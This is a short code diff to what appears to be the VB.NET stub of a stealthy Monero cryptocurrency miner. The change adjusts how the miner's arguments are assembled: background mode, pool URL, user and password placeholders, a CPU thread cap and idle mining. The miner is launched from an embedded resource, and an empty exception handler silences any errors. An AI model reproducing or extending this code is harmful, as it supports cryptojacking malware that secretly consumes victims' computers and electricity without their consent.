@@ -170,9 +170,9 @@ Public Class Program
 #End If
 
             'If --donate-level is set to 5 idle mining is enabled if --donate-level is anything other than 5 idle mining is disabled
-            Dim argstr As String = " -B --coin=monero --url=""#URL"" --user=""#USER"" --pass=""#PWD"" --cpu-max-threads-hint=#MaxCPU "
+            Dim argstr As String = " -B --coin=monero --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=#MaxCPU "
             argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
-            Run(GetTheResource("#dll"), runString + argstr, xmrminer)
+            Run(GetTheResource("#dll"), argstr + runString, xmrminer)
         Catch ex As Exception
         End Try
     End Sub
